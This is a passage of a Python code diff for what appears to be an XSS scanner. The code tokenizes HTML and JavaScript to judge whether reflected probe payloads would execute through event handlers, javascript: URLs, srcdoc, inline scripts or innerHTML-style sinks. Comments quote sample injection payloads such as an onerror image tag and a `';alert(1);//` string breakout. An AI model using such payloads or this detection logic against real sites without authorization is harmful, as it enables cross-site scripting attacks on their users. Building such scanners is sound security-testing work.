+            if (tag in _SVG_INTEGRATION_POINTS if foreign_root == "svg"
+                    else tag in _MATHML_INTEGRATION_POINTS):
+                foreign_depth = 0  # integration point: the content is parsed as HTML
+                foreign_root = ""
+                continue
+            if tag in _FOREIGN_BREAKOUT_ELEMENTS:
+                foreign_depth = 0  # HTML element inside SVG/MathML → back to HTML
+                foreign_root = ""
+            continue  # foreign content: no RCDATA/RAWTEXT, no PLAINTEXT
+        if tag == "body":
+            saw_body = True
+        elif tag == "frameset" and not saw_body and frameset < 0:
+            frameset = lt
+        if tag == "plaintext":
+            out.append((i, n, "plaintext", tag, ""))
+            if template_depth > 0:
+                inert.append((template_start, n))
+            return out, inert, frameset
+        # In text/html the solidus is IGNORED on these elements, so an XHTML-style
+        # `<script src=a/>` / `<title/>` / `<textarea/>` opens raw text that runs to the
+        # matching end tag (or to EOF) and everything after it stops being markup.
+        if tag in _RAW_TEXT_ELEMENTS and not (self_closing and xml):
+            end = _find_appropriate_end_tag(lower, i, tag)
+            kind = "rcdata" if tag in _RCDATA_ELEMENTS else "rawtext"
+            # Carry the element's own body type into the content region: it decides
+            # whether a <script> body is executed JavaScript or inert data.
+            out.append((i, end, kind, tag,
+                        _script_body_type(html, out, mark) if tag == "script" else ""))
+            i = data_start = end
+    if data_start < n and data_start <= limit:
+        out.append((data_start, n, "data", "", ""))
+    if template_depth > 0:
+        inert.append((template_start, n))
+    return out, inert, frameset
+
+
+# PURE
+def _comment_end(html: str, lt: int, n: int) -> int:
+    """One past the '>' that closes the comment opened by the "<!--" at `lt`.
+
+    HTML tokenizer, comment start / comment start dash states: a '>' seen there closes the
+    comment IMMEDIATELY. "<!-->" and "<!--->" are therefore COMPLETE, empty comments and
+    whatever follows them is live markup — the "abrupt-closing comment" parse error.
+    """
+    p = lt + 4
+    if html[p:p + 1] == ">":
+        return p + 1
+    if html[p:p + 2] == "->":
+        return p + 2
+    close = _COMMENT_END_RE.search(html, p)
+    return n if close is None else close.end()
+
+
+# PURE
+def _script_body_type(html: str, out: List[_HtmlRegion], mark: int) -> str:
+    """The body type carried into a <script> element's content region.
+
+    Returns the element's `type` (entity-decoded: attribute values are decoded before the
+    type is matched against the JavaScript MIME types), or a sentinel when the browser
+    never executes the inline body at all: `src` makes the element load the external
+    script and IGNORE its content, and `nomodule` suppresses execution in every browser
+    that supports modules — which is every browser that runs the payload.
+    """
+    script_type = ""
+    for region in out[mark:]:
+        attr = region[_R_ATTR]
+        if not attr:
+            continue
+        if attr == "src" or attr == "nomodule":
+            return _SCRIPT_BODY_IGNORED
+        if attr == "type" and not script_type and region[_R_KIND] in _ATTR_VALUE_KINDS:
+            raw = html[region[_R_START]:region[_R_END]]
+            script_type = (html_module.unescape(raw) if "&" in raw else raw).strip().lower()
+    return script_type
+
+
+# PURE
+def _apply_input_state(html: str, out: List[_HtmlRegion], mark: int) -> str:
+    """Record an <input>'s effective `type` in the tag label of every region it owns.
+
+    Which events an injected handler can fire depends on it: a hidden input is not
+    rendered (nothing can focus, click or hover it) and only `type=image` fetches a
+    resource. The FIRST type attribute wins, per the duplicate-attribute rule — so a
+    payload that declares its own `type=` after the server's does not change anything.
+    """
+    state = ""
+    for region in out[mark:]:
+        if region[_R_ATTR] == "type" and region[_R_KIND] in _ATTR_VALUE_KINDS:
+            raw = html[region[_R_START]:region[_R_END]]
+            state = (html_module.unescape(raw) if "&" in raw else raw).strip().lower()
+            break
+    tag = "input" + _ELEMENT_STATE_SEP + (state or "text")
+    for k in range(mark, len(out)):
+        r = out[k]
+        out[k] = (r[_R_START], r[_R_END], r[_R_KIND], tag, r[_R_ATTR])
+    return tag
+
+
+# PURE
+def _apply_iframe_sandbox(html: str, out: List[_HtmlRegion], mark: int) -> None:
+    """Neutralise `srcdoc` on a sandboxed <iframe>.
+
+    HTML standard, the sandbox attribute: without `allow-scripts` the nested document
+    gets an opaque origin and scripting is disabled, so its markup is parsed and nothing
+    in it runs. Renaming the attribute (rather than dropping the region) keeps the region
+    map gap-free and still lets a payload that ESCAPES the value be judged as tag content
+    — the iframe's OWN handlers are outside the sandbox and do fire.
+    """
+    sandboxed = False
+    srcdoc_at = -1
+    for k in range(mark, len(out)):
+        attr = out[k][_R_ATTR]
+        if attr == "sandbox":
+            raw = html[out[k][_R_START]:out[k][_R_END]]
+            sandboxed = (out[k][_R_KIND] not in _ATTR_VALUE_KINDS
+                         or "allow-scripts" not in raw.lower())
+        elif attr == "srcdoc" and out[k][_R_KIND] in _ATTR_VALUE_KINDS:
+            srcdoc_at = k
+    if sandboxed and srcdoc_at != -1:
+        r = out[srcdoc_at]
+        out[srcdoc_at] = (r[_R_START], r[_R_END], r[_R_KIND], r[_R_TAG],
+                          "srcdoc" + _ELEMENT_STATE_SEP + "sandboxed")
+
+
+# PURE
+def _apply_meta_csp(html: str, out: List[_HtmlRegion], mark: int) -> None:
+    """Mark the `content` of a <meta http-equiv="Content-Security-Policy"> as a policy.
+
+    Renaming the attribute in the region map is how the policy is carried out of the
+    tokenizer: the alternative — a second, regex-driven pass over the document — would be
+    the one thing this parser exists to avoid, because a `<meta http-equiv=...>` written
+    inside a comment or an attribute value would then be read as a real policy.
+    """
+    is_csp = False
+    content_at = -1
+    for k in range(mark, len(out)):
+        attr = out[k][_R_ATTR]
+        if out[k][_R_KIND] not in _ATTR_VALUE_KINDS:
+            continue
+        if attr == "http-equiv":
+            is_csp = (html[out[k][_R_START]:out[k][_R_END]].strip().lower()
+                      == "content-security-policy")
+        elif attr == "content":
+            content_at = k
+    if is_csp and content_at != -1:
+        r = out[content_at]
+        out[content_at] = (r[_R_START], r[_R_END], r[_R_KIND], r[_R_TAG], _META_CSP_ATTR)
+
+
+# PURE
+def _html_regions(html: str) -> Tuple[_HtmlRegion, ...]:
+    """Every parse-state region of the whole document, in document order."""
+    return _html_index(html, len(html), False)[0]
+
+
+# =============================================================================
+# JAVASCRIPT TOKEN STATE (PURE)
+# =============================================================================
+# A reflection inside an inline <script> is NOT judged by markup: <script> content never
+# contains tags, so "no </script> in the payload" only proves it cannot escape the
+# ELEMENT — it says nothing about escaping the JS STRING, which is how script-context XSS
+# actually works (var q = '<?= $q ?>', wp_localize_script, drupalSettings, __NUXT__, gon).
+# These are the ECMAScript lexical token kinds, not a heuristic list.
+
+# HTML "classic script" / module: a <script> whose type is absent, empty, a JavaScript
+# MIME type or "module" is executed as JS. Any other type (application/json,
+# text/x-template, text/x-handlebars) is DATA, so its content stays inert.
+_JS_SCRIPT_TYPES = frozenset({
+    "", "module", "text/javascript", "application/javascript", "text/ecmascript",
+    "application/ecmascript", "text/jscript", "text/livescript", "text/x-javascript",
+    "text/x-ecmascript", "application/x-javascript", "application/x-ecmascript",
+    "text/javascript1.0", "text/javascript1.1", "text/javascript1.2",
+    "text/javascript1.3", "text/javascript1.4", "text/javascript1.5",
+})
+
+# After these keywords a '/' opens a REGULAR EXPRESSION; after an identifier, a number,
+# ')' or ']' it is the division operator. Standard ECMAScript lexical-goal disambiguation.
+_JS_REGEX_KEYWORDS = frozenset({
+    "return", "typeof", "instanceof", "in", "of", "new", "delete", "void", "throw",
+    "case", "do", "else", "yield", "await",
+})
+_JS_IDENT_CHARS = frozenset(
+    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_$")
+_JS_SPACE = frozenset(" \t\r\n\f\v   ")
+
+
+class _JsToken(NamedTuple):
+    """One non-code ECMAScript token: [start, end] inclusive of both delimiters."""
+    start: int   # index of the opening delimiter
+    end: int     # index of the CLOSING delimiter (len(js) when never closed)
+    kind: str    # string | template | regex | line_comment | block_comment
+
+
+# PURE
+def _js_scan_quoted(js: str, i: int, quote: str) -> int:
+    """Index of the delimiter closing the string/template opened at `i` (len when open).
+
+    Backslash-escape aware, which is the whole point of the control this must preserve:
+    a server that doubled the backslash (\\\\' ) leaves a FREE quote that closes the
+    string, one that escaped the quote itself (\\\\\\' ) does not.
+    """
+    n = len(js)
+    k = i + 1
+    while k < n:
+        ch = js[k]
+        if ch == "\\":
+            k += 2
+            continue
+        if ch == quote:
+            return k
+        k += 1
+    return n
+
+
+# PURE
+def _js_scan_regex(js: str, i: int) -> int:
+    """Index of the '/' closing the regex literal opened at `i` (len when unterminated)."""
+    n = len(js)
+    k = i + 1
+    in_class = False
+    while k < n:
+        ch = js[k]
+        if ch == "\\":
+            k += 2
+            continue
+        if ch == "\n":
+            return k  # a regex literal cannot span lines
+        if ch == "[":
+            in_class = True
+        elif ch == "]":
+            in_class = False
+        elif ch == "/" and not in_class:
+            return k
+        k += 1
+    return n
+
+
+# PURE
+def _js_regex_allowed(js: str, i: int) -> bool:
+    """True when the '/' at `i` starts a regex literal rather than a division operator.
+
+    Walks backwards over the preceding token INDEX BY INDEX. Slicing `js[:i]` here would
+    copy the whole prefix at every '/' in the file, which is quadratic on a script full of
+    divisions or URLs — the same shape as the catastrophic-backtracking incident this
+    parser exists to avoid. The backward walk is bounded by the length of the token it
+    steps over, so the total stays linear in len(js).
+    """
+    k = i - 1
+    while k >= 0 and js[k] in _JS_SPACE:
+        k -= 1
+    if k < 0:
+        return True
+    prev = js[k]
+    if prev in ")]":
+        return False
+    if prev in _JS_IDENT_CHARS:
+        word_end = k + 1
+        while k >= 0 and js[k] in _JS_IDENT_CHARS:
+            k -= 1
+        return js[k + 1:word_end] in _JS_REGEX_KEYWORDS
+    return True
+
+
+# PURE
+@lru_cache(maxsize=16)
+def _js_tokens(js: str) -> Tuple[_JsToken, ...]:
+    """Lex `js` into its non-code tokens, left to right. Linear, no backtracking."""
+    n = len(js)
+    out: List[_JsToken] = []
+    i = 0
+    while i < n:
+        ch = js[i]
+        if ch in "'\"":
+            end = _js_scan_quoted(js, i, ch)
+            out.append(_JsToken(i, end, "string"))
+            i = end + 1
+            continue
+        if ch == "`":
+            end = _js_scan_quoted(js, i, ch)
+            out.append(_JsToken(i, end, "template"))
+            i = end + 1
+            continue
+        if ch == "<" and js.startswith("<!--", i):
+            # ECMAScript Annex B.1.1 (normative for web browsers): "<!--" is a
+            # SingleLineHTMLOpenComment. Legacy pages that wrap an inline script in
+            # `<!-- ... //-->` really do comment out everything after it on that line.
+            close = js.find("\n", i + 4)
+            end = n if close == -1 else close
+            out.append(_JsToken(i, end, "line_comment"))
+            i = end + 1
+            continue
+        if ch == "/" and i + 1 < n:
+            nxt = js[i + 1]
+            if nxt == "/":
+                close = js.find("\n", i + 2)
+                end = n if close == -1 else close
+                out.append(_JsToken(i, end, "line_comment"))
+                i = end + 1
+                continue
+            if nxt == "*":
+                close = js.find("*/", i + 2)
+                end = n if close == -1 else close + 1
+                out.append(_JsToken(i, end, "block_comment"))
+                i = end + 1
+                continue
+            if _js_regex_allowed(js, i):
+                end = _js_scan_regex(js, i)
+                out.append(_JsToken(i, end, "regex"))
+                i = end + 1
+                continue
+        i += 1
+    return tuple(out)
+
+
+# PURE
+@lru_cache(maxsize=16)
+def _js_index(js: str) -> Tuple[Tuple[_JsToken, ...], Tuple[int, ...]]:
+    """Tokens plus their start offsets, so a bisect key is never rebuilt per occurrence."""
+    tokens = _js_tokens(js)
+    return tokens, tuple(t.start for t in tokens)
+
+
+# PURE
+def _js_span_escapes(js: str, start: int, end: int) -> bool:
+    """True when the payload occupying [start, end) of `js` reaches the JS engine as CODE.
+
+    Three ways, all of them token-state facts rather than payload signatures:
+      * the injection point is already in code position (nothing wraps it);
+      * the token wrapping it CLOSES inside the payload span — the payload wrote the
+        delimiter that ends the string / template / comment / regex;
+      * the wrapper is a template literal and the payload opens an ${...} interpolation,
+        which is code without closing the literal.
+    Everything else is data. That is exactly the control that must keep rejecting a server
+    which escaped the quote away.
+    """
+    try:
+        tokens, starts = _js_index(js)
+    except Exception:  # unknown state → fail OPEN
+        return True
+    idx = bisect_right(starts, start) - 1
+    if idx < 0:
+        return True  # before every token → code position
+    token = tokens[idx]
+    if start <= token.start or start > token.end:
+        return True  # between tokens, or the payload wrote the opening delimiter → code
+    if token.end < end:
+        return True  # the payload carries the delimiter that closes the token
+    if token.kind == "template":
+        if "${" in js[start:end]:
+            return True
+        if js.rfind("${", token.start, start) > js.rfind("}", token.start, start):
+            return True  # the injection point sits inside an ${...} interpolation
+    return False
+
+
+_JS_BRACKET_RE = re.compile(r"[()\[\]{}]")
+_JS_BRACKET_OPENER = {")": "(", "]": "[", "}": "{"}
+
+# The DOM/HTML entry points that run the HTML FRAGMENT PARSING ALGORITHM on a string.
+# A payload that is inert as JavaScript — safely inside a string literal — is still live
+# MARKUP when that literal is handed to one of these, which is the whole of "the server
+# escaped my quotes so I am safe" being wrong. The set is the standard's list of
+# HTML-parsing sinks, not names harvested off a site; the assignment targets that only
+# ever set TEXT (textContent, innerText, setAttribute, value) are deliberately absent.
+#
+# Anchored at the END of the code that precedes the literal, so only a literal passed
+# DIRECTLY to the sink counts. `unescape`/`decodeURI`/`decodeURIComponent` are allowed in
+# between because they are pure, total percent-decoders whose output we can reproduce.
+_JS_HTML_SINK_RE = re.compile(
+    r"(?:"
+    r"(?:inner|outer)HTML\s*\+?=|srcdoc\s*\+?="
+    r"|document\s*\.\s*(?:write|writeln)\s*\("
+    r"|insertAdjacentHTML\s*\(\s*[^,()]{0,32},"
+    r")\s*(?:(unescape|decodeURI|decodeURIComponent)\s*\(\s*)?$",
+    re.IGNORECASE)
+# ECMAScript StringEscapeSequence. The decoded literal is what the parser actually sees,
+# so `'\u003cimg src=x onerror=alert(1)\u003e'` is markup even though the response body
+# contains no '<' at all.
+_JS_ESCAPE_RE = re.compile(
+    r"\\(?:u\{([0-9a-fA-F]+)\}|u([0-9a-fA-F]{4})|x([0-9a-fA-F]{2})|\r\n|(.))", re.S)
+_JS_ESCAPE_SHORT = {"n": "\n", "t": "\t", "r": "\r", "b": "\b", "f": "\f", "v": "\v",
+                    "0": "\0"}
+
+
+# PURE
+def _js_unescape(text: str) -> str:
+    """Resolve ECMAScript escape sequences in a string-literal body."""
+    def sub(m):
+        long_hex, u4, x2, other = m.groups()
+        if long_hex is not None or u4 is not None:
+            try:
+                return chr(int(long_hex or u4, 16))
+            except (ValueError, OverflowError):
+                return m.group(0)
+        if x2 is not None:
+            return chr(int(x2, 16))
+        if other is None:
+            return ""  # escaped line terminator: line continuation
+        return _JS_ESCAPE_SHORT.get(other, other)
+    return _JS_ESCAPE_RE.sub(sub, text)
+
+
+# PURE
+def _js_wrapping_token(js: str, start: int) -> Optional[_JsToken]:
+    """The string/template token that CONTAINS the offset `start`, if any."""
+    tokens, starts = _js_index(js)
+    idx = bisect_right(starts, start) - 1
+    if idx < 0:
+        return None
+    token = tokens[idx]
+    if token.start < start <= token.end and token.kind in ("string", "template"):
+        return token
+    return None
+
+
+# PURE
+def _js_literal_reaches_html_sink(js: str, start: int, end: int) -> bool:
+    """True when the payload sits in a string literal that is PARSED AS HTML by the DOM.
+
+    The classifier's "inside a JS string with no breakout ⇒ inert" rule is right about the
+    HTML parser and silent about the DOM: `el.innerHTML = '<payload>'` and
+    `document.write('<payload>')` re-parse that same string as markup. The payload is
+    judged in the DECODED fragment with the ordinary position rules, so a string the
+    server did escape (`&lt;img`) still comes out inert, and a sibling assignment to
+    textContent / setAttribute is not a sink at all.
+    """
+    token = _js_wrapping_token(js, start)
+    if token is None or token.end >= len(js):
+        return False
+    m = _JS_HTML_SINK_RE.search(js[:token.start].rstrip())
+    if m is None:
+        return False
+    fragment = _js_unescape(js[token.start + 1:token.end])
+    forms = [js[start:end]]
+    decoded = _js_unescape(forms[0])
+    if decoded != forms[0]:
+        forms.append(decoded)
+    if m.group(1):  # the literal is percent-decoded on its way into the sink
+        fragment = urllib.parse.unquote(fragment)
+        forms += [urllib.parse.unquote(f) for f in tuple(forms)]
+    for form in dict.fromkeys(forms):
+        if form and form in fragment and any(
+                _position_executes(p, form, tag, tail, host)
+                for p, tag, tail, host in _reflection_occurrences(fragment, form)):
+            return True
+    return False
+
+
+# PURE
+def _js_code_balanced(js: str) -> bool:
+    """True when `js` shows no structural sign of being unparseable.
+
+    Two one-way tests, both of which prove a SyntaxError when they fail:
+      * every bracket OUTSIDE a string/template/regex/comment is matched — a well-formed
+        ECMAScript program always balances (), [] and {};
+      * no string or template literal runs off the end of the program.
+    The converse of neither holds, so this is only ever used to prove FAILURE.
+    """
+    n = len(js)
+    tokens, _ = _js_index(js)
+    stack: List[str] = []
+    segments: List[str] = []
+    pos = 0
+    for tok in tokens:
+        if tok.end >= n and (tok.kind == "string" or tok.kind == "template"):
+            return False  # unterminated literal: the program cannot be compiled
+        if tok.start > pos:
+            segments.append(js[pos:tok.start])
+        pos = min(n, tok.end + 1)
+    if pos < len(js):
+        segments.append(js[pos:])
+    for segment in segments:
+        for ch in _JS_BRACKET_RE.findall(segment):
+            if ch in "([{":
+                stack.append(ch)
+            elif not stack or stack.pop() != _JS_BRACKET_OPENER[ch]:
+                return False
+    return not stack
+
+
+# PURE
+def _js_breakout_parses(js: str, start: int, end: int) -> bool:
+    """False when the breakout at [start, end) leaves a program the engine cannot compile.
+
+    An inline classic script (and an event handler, and a javascript: URL) is compiled as
+    a WHOLE unit: a SyntaxError anywhere in it discards ALL of it, including the code the
+    payload smuggled in. That is why `{query:'PAYLOAD', page:1}` with a `';alert(1);//`
+    payload runs nothing — the `//` eats the object literal's own closing brace and the
+    script never compiles — while the same payload in `var q='PAYLOAD'` does run.
+
+    DIFFERENTIAL, not absolute: the imbalance only counts against the payload when the
+    SAME script balances without it. If our lexer cannot make sense of the page's own
+    JavaScript, that is our problem, not evidence of inertness, and we fail OPEN.
+    The removal span absorbs any backslash run immediately before the reflection, because
+    that escaping is the server's rewrite OF the reflection (see _reflected_forms).
+    """
+    try:
+        if _js_code_balanced(js):
+            return True
+        at = start
+        while at > 0 and js[at - 1] == "\\":
+            at -= 1
+        return not _js_code_balanced(js[:at] + js[end:])
+    except Exception:  # unknown state → fail OPEN
+        return True
+
+
+# HTML event handler content attributes are the `on<eventname>` family — a naming rule in
+# the standard, not a list of handler names we would have to keep guessing at.
+_EVENT_HANDLER_NAME_RE = re.compile(r"^on[a-z]+$")
+# Leading characters a URL parser strips before the scheme (C0 controls + space).
+_URL_LEADING_STRIP = "".join(chr(c) for c in range(0x21)) + "\x7f"
+
+
+# PURE
+def _attribute_injection_contexts(html: str, payload: str) -> frozenset:
+    """Which ATTRIBUTE-level execution contexts `payload` reaches, per attribute.
+
+    The attribute name comes from the tokenizer, so `<meta content="...">` can no longer
+    be read as an `ontent=` event handler, and `srcdoc` is an attribute NAME rather than a
+    substring of somebody's text. Whether the payload executes INSIDE the attribute is then
+    a JS lexer question — `onclick="filter('PAYLOAD')"` and `href="javascript:go('PAYLOAD')"`
+    put the payload inside a JS STRING, which the old `[^"']*?` regexes could not even
+    reach, let alone judge.
+
+    An attribute value is ENTITY-DECODED before it is compiled as a handler, parsed as a
+    URL or parsed as an srcdoc document, so the check runs on the decoded value. That is
+    the canonical "htmlspecialchars(ENT_QUOTES) is not enough inside an event handler"
+    bug — onclick="f('&#039;-alert(1)-&#039;')" really does close the JS string — and it
+    is what makes href="&#106;avascript:" and an entity-escaped srcdoc work. Entity
+    encoding only proves inertness in MARKUP position, which the position classifier owns.
+
+    Returns a subset of {"event_handler", "javascript_uri", "srcdoc"}.
+    """
+    # An attribute value can only hold the payload verbatim, or hold it entity-encoded —
+    # and an entity needs an '&'. A body with neither cannot produce a hit under ANY
+    # attribute, so the whole tokenizer is skipped on two C-level scans. This is the
+    # dominant case during a payload sweep: most probes never reflect at all.
+    if payload not in html and "&" not in html:
+        return frozenset()
+    found = set()
+    url_forms = None
+    for value, role, js_at in _attribute_candidates(html):
+        if role == "javascript_uri":
+            # The URL parser decodes entities and drops tab/newline BEFORE the scheme is
+            # read, so `java&#09;script:` and `javascript&colon;` are the same URL — and
+            # the payload that produced them no longer appears verbatim in it.
+            if url_forms is None:
+                url_forms = _url_payload_forms(payload)
+            hit = next((f for f in url_forms if f in value), None)
+            if hit is not None and _js_value_executes(value, hit, js_at):
+                found.add(role)
+            continue
+        if payload not in value:
+            continue
+        if role == "srcdoc":
+            # The decoded value is parsed as a whole HTML document.
+            if any(_position_executes(p, payload, tag, tail, host)
+                   for p, tag, tail, host in _reflection_occurrences(value, payload)):
+                found.add("srcdoc")
+        elif _js_value_executes(value, payload, js_at):
+            found.add(role)
+    return frozenset(found)
+
+
+# PURE
+def _url_payload_forms(payload: str) -> Tuple[str, ...]:
+    """`payload` plus the shapes the URL parser rewrites it into before reading a scheme.
+
+    URL standard: every ASCII tab and newline is removed from the input, and the value it
+    is read from was HTML-entity-decoded first. Both are decodings the SERVER did not do
+    — they are what the browser does — so the payload has to be looked for in the same
+    normalised space as the value.
+    """
+    forms = [payload]
+    if "&" in payload:
+        decoded = html_module.unescape(payload)
+        if decoded != payload:
+            forms.append(decoded)
+    for form in tuple(forms):
+        stripped = form.translate(_URL_TAB_STRIP)
+        if stripped != form:
+            forms.append(stripped)
+    return tuple(dict.fromkeys(forms))
+
+
+# PURE
+@lru_cache(maxsize=2)
+def _attribute_candidates(html: str) -> Tuple[Tuple[str, str, int], ...]:
+    """Every attribute value of `html` that could execute AT ALL, already decoded.
+
+    Splits the attribute analysis along the only axis that matters for cost: which
+    attribute values are execution sinks is a property of the RESPONSE, while whether a
+    given payload escapes inside one is a property of the PROBE. A payload sweep asks the
+    second question hundreds of times against the same response, so the first is answered
+    once. Everything here — tokenizing, matching the on<event> naming rule, entity-decoding
+    the value, recognising the javascript: scheme — is response-only work.
+
+    Returns (decoded value, role, js offset) per sink, where role is one of
+    "event_handler" / "javascript_uri" / "srcdoc" and the offset is where the JavaScript
+    starts inside the decoded value (0 for a handler, past "javascript:" for a URI).
+    A URL attribute that does not carry a javascript: URI is not a sink and is dropped.
+    """
+    out: List[Tuple[str, str, int]] = []
+    regions, _starts, inert, _fs = _html_index(html, len(html), False)
+    for region in regions:
+        attr = region[_R_ATTR]
+        if not attr or region[_R_KIND] not in _ATTR_VALUE_KINDS:
+            continue
+        tag = region[_R_TAG]
+        is_handler = bool(_EVENT_HANDLER_NAME_RE.match(attr))
+        is_srcdoc = attr == "srcdoc"
+        is_url = (_element_name(tag), attr) in _NAVIGATING_URL_ATTRIBUTES
+        if not (is_handler or is_srcdoc or is_url):
+            continue
+        # Nothing inside a <template>'s contents, and nothing on an element that is never
+        # rendered, can fire a handler or start a navigation.
+        if tag in _NOT_RENDERED_ELEMENTS or _in_inert_subtree(inert, region[_R_START],
+                                                              region[_R_END]):
+            continue
+        raw = html[region[_R_START]:region[_R_END]]
+        value = html_module.unescape(raw) if "&" in raw else raw
+        if is_handler:
+            out.append((value, "event_handler", 0))
+        elif is_srcdoc:
+            out.append((value, "srcdoc", 0))
+        else:
+            url = value.translate(_URL_TAB_STRIP)
+            scheme = url.lstrip(_URL_LEADING_STRIP)
+            if scheme[:11].lower() == "javascript:":
+                out.append((url, "javascript_uri", len(url) - len(scheme) + 11))
+    return tuple(out)
+
+
+# PURE
+def _js_value_executes(value: str, payload: str, js_start: int) -> bool:
+    """True when `payload`, as reflected in `value`, reaches the JS engine as code.
+
+    `js_start` is where the JavaScript begins inside the attribute value (0 for an event
+    handler, past "javascript:" for a URI). A payload that overlaps the scheme itself wrote
+    the scheme, so it executes by construction.
+
+    A handler body and a javascript: URL are compiled as whole scripts, so a breakout that
+    leaves them unparseable creates no handler and runs no code.
+    """
+    js = value[js_start:]
+    at = value.find(payload)
+    while at != -1:
+        if at < js_start:
+            return True  # the payload supplied (part of) the javascript: scheme
+        s, e = at - js_start, at - js_start + len(payload)
+        if _js_span_escapes(js, s, e) and _js_breakout_parses(js, s, e):
+            return True
+        at = value.find(payload, at + 1)
+    return False
+
+
+# PURE
+def _inline_script_bodies(html: str) -> List[Tuple[str, int]]:
+    """(body, document offset) of every inline <script> that the browser runs as JS."""
+    if _SCRIPT_OPEN_RE.search(html) is None:
+        return []  # no <script> anywhere: nothing to tokenize the document for
+    regions, _starts, inert, _fs = _html_index(html, len(html), False)
+    return [(html[r[_R_START]:r[_R_END]], r[_R_START]) for r in regions
+            if r[_R_KIND] == "rawtext" and r[_R_TAG] == "script"
+            and r[_R_ATTR] in _JS_SCRIPT_TYPES
+            and not _in_inert_subtree(inert, r[_R_START], r[_R_END])]
+
+
+# PURE
+def _reflected_forms(payload: str) -> Tuple[str, ...]:
+    """The payload plus the shapes a server rewrites it into on the way back.
+
+    Only transformations that ADD escaping — the point is to still find the reflection
+    when the response no longer contains the payload verbatim. Whether the rewritten form
+    still executes is then decided by the lexer, never by the shape itself.
+    """
+    forms = [payload]
+    if "\\" in payload:
+        forms.append(payload.replace("\\", "\\\\"))  # server doubles backslashes
+    for sequence in ("\\'", '\\"'):
+        if sequence in payload:
+            tail = payload.split(sequence, 1)[1]
+            if tail:
+                forms.append(sequence[1] + tail)  # the backslash was consumed, quote is free
+    return tuple(dict.fromkeys(forms))
+
+
+# PURE
+def _find_appropriate_end_tag(lower_html: str, start: int, tag: str) -> int:
+    """Offset of the '</tag' that ends a raw-text element (len when never closed).
+
+    HTML "appropriate end tag" rule: '</scriptx' does NOT close a <script>; the name has
+    to be followed by whitespace, '/' or '>'.
+    """
+    needle = "</" + tag
+    at = lower_html.find(needle, start)
+    while at != -1:
+        after = lower_html[at + len(needle): at + len(needle) + 1]
+        if after == "" or after in _HTML_SPACE or after in (">", "/"):
+            return at
+        at = lower_html.find(needle, at + 1)
+    return len(lower_html)
+
+
+# PURE
+@lru_cache(maxsize=2)
+def _html_index(
+    html: str, limit: int, xml: bool
+) -> Tuple[Tuple[_HtmlRegion, ...], Tuple[int, ...], Tuple[Tuple[int, int], ...], int]:
+    """Regions plus their start offsets, so a bisect key is never rebuilt per occurrence.
+
+    ONE cache for the whole tokenizer, and a deliberately tiny one. The response body
+    holds the payload, so it differs on every probe and a large cache can never hit —
+    all it can do is PIN every distinct page that was ever classified (hundreds of MB on
+    a scan that touches multi-megabyte responses). Size 2 is exactly what the access
+    pattern needs: the four confirmation checks run back-to-back over the same body, and
+    consecutive non-reflecting probes share an identical body.
+
+    The third and fourth elements are the inert-subtree span list (<template> contents)
+    and the frameset offset.
+    """
+    regions, inert, frameset = _scan_html(html, limit, xml)
+    regions = tuple(regions)
+    return regions, tuple(map(_itemgetter(_R_START), regions)), tuple(inert), frameset
+
+
+# PURE
+def _in_inert_subtree(spans: Tuple[Tuple[int, int], ...], start: int, end: int) -> bool:
+    """True when [start, end) is wholly inside one of the inert subtrees.
+
+    A payload that runs PAST the span end wrote the `</template>` that closed it, so it is
+    back in the live document — the same "the construct ends inside the payload" rule the
+    comment and attribute-value breakouts use.
+    """
+    for span_start, span_end in spans:
+        if span_start <= start and end <= span_end:
+            return True
+        if span_start > start:
+            break  # spans are emitted in document order
+    return False
+
+
+# PURE
+def _region_index_at(
+    regions: Tuple[_HtmlRegion, ...], starts: Tuple[int, ...], pos: int, html: str
+) -> int:
+    """Index of the region describing the parse state the point at `pos` LANDED IN (-1: none).
+
+    A region of one of _PAYLOAD_OPENED_KINDS that begins exactly at `pos` was opened by the
+    payload's OWN first character (`<img ...` opens a tag, a stray quote closes the
+    attribute value it sat in), so the enclosing state is the region before it — the state
+    the server was in when it wrote the reflection, which is what "position" means here.
+    Content regions (data / rawtext / attribute value) that begin at `pos` are NOT stepped
+    over: those were opened by the server's own markup just before the injection point.
+
+    The INDEX rather than the region itself, because the owning start tag is found by
+    walking its neighbours (see _host_attribute_names) and re-deriving the index from a
+    start offset is ambiguous: an empty attribute value (`value=""`) makes two regions
+    begin at the same offset.
+
+    `starts` is the precomputed list of region start offsets, so the lookup is O(log n)
+    per occurrence instead of rebuilding the key list every time.
+    """
+    idx = bisect_right(starts, pos) - 1
+    if idx < 0:
+        return -1
+    while (idx > 0 and regions[idx][_R_START] == pos
+           and regions[idx][_R_KIND] in _PAYLOAD_OPENED_KINDS):
+        idx -= 1
+    region = regions[idx]
+    # Stepping back can land on a construct that ENDED exactly at `pos`. It still owns the
+    # position when the payload's own first character is what closed it (the quote that
+    # terminates the attribute value it was injected into) — but a start tag the SERVER
+    # closed with its own '>' hands the position straight back to content. `<p>PAYLOAD` is
+    # a text position, not an attribute of the <p>; without this the whole "does the
+    # payload get out of the tag" question gets asked about a tag it was never in.
+    if (region[_R_END] == pos and region[_R_KIND] == "tag"
+            and html[pos - 1:pos] == ">"):
+        return -1
+    return idx if region[_R_START] <= pos <= region[_R_END] else -1
+
+
+# PURE
+def _tag_name_runs(html: str, regions: Tuple[_HtmlRegion, ...], first: int) -> str:
+    """Join the NAME runs of the start tag that opens at region `first`.
+
+    _scan_tag emits a start tag as alternating name runs (kind "tag": the element name,
+    the whitespace, the attribute names, the delimiters) and value runs (the two
+    _ATTR_VALUE_KINDS). Keeping only the name runs is what makes a `class="tabindex"`
+    unable to masquerade as the attribute — and the asymmetry is safe in the one
+    direction that matters, because a spurious match answers "focusable", which fails
+    OPEN.
+    """
+    tag = regions[first][_R_TAG]
+    names = []
+    at = first
+    while at < len(regions):
+        region = regions[at]
+        if region[_R_TAG] != tag or region[_R_KIND] not in _IN_TAG_KINDS:
+            break
+        if region[_R_KIND] == "tag":
+            names.append(html[region[_R_START]:region[_R_END]])
+            if html[region[_R_END] - 1:region[_R_END]] == ">":
+                break  # the tag is closed: everything after belongs to another element
+        at += 1
+    return "".join(names)
+
+
+# PURE
+def _host_attribute_names(
+    html: str, regions: Tuple[_HtmlRegion, ...], idx: int, memo: Dict[int, str]
+) -> str:
+    """The ATTRIBUTE-NAME text of the start tag that owns region `idx` ("" when unknown).
+
+    Whether an injected handler can fire is a property of the element the server wrote,
+    and for the focus family that property lives in the element's ATTRIBUTES (`tabindex`,
+    `contenteditable`, `href`, `controls`) rather than in its name.
+
